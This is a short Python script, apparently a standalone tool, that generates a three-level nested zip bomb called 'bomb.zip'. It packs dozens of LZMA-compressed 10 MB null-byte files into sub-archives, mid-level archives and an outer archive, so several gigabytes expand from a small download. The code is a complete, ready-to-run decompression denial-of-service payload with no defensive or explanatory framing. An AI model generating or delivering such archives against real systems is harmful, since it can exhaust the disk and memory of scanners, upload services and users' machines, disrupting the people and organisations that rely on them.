import zipfile
import os


def create_inside(zip_name, num_files, file_content):
    with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_LZMA) as zip_file:
        for i in range(num_files):
            zip_file.writestr(f"inside_file_{i}.txt", file_content)
    return zip_name


def create_mid(zip_name, num_sub_zips, num_files_per_sub, file_content):
    sub_zip_names = []
    for j in range(num_sub_zips):
        sub_zip_name = f"sub_{j}.zip"
        create_inside(sub_zip_name, num_files_per_sub, file_content)
        sub_zip_names.append(sub_zip_name)

    with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_LZMA) as zip_file:
        for sub_zip in sub_zip_names:
            zip_file.write(sub_zip, os.path.basename(sub_zip))

    for sub_zip in sub_zip_names:
        try:
            os.remove(sub_zip)
        except OSError:
            pass

    return zip_name


def build_bomb(num_mid_zips, num_sub_zips, num_files_per_sub, file_size):
    big_content = b'\x00' * file_size
    mid_zip_names = []

    for i in range(num_mid_zips):
        mid_zip_name = f"mid_{i}.zip"
        create_mid(mid_zip_name, num_sub_zips, num_files_per_sub, big_content)
        mid_zip_names.append(mid_zip_name)

    outer_zip_name = "bomb.zip"
    with zipfile.ZipFile(outer_zip_name, "w", compression=zipfile.ZIP_LZMA) as zip_file:
        for mid_zip in mid_zip_names:
            zip_file.write(mid_zip, os.path.basename(mid_zip))

    for mid_zip in mid_zip_names:
        try:
            os.remove(mid_zip)
        except OSError:
            pass

    return outer_zip_name


num_mid_zips = 12
num_sub_zips = 3
num_files_per_sub = 15
file_size = 10 * 1024 * 1024

final_bomb = build_bomb(num_mid_zips, num_sub_zips, num_files_per_sub, file_size)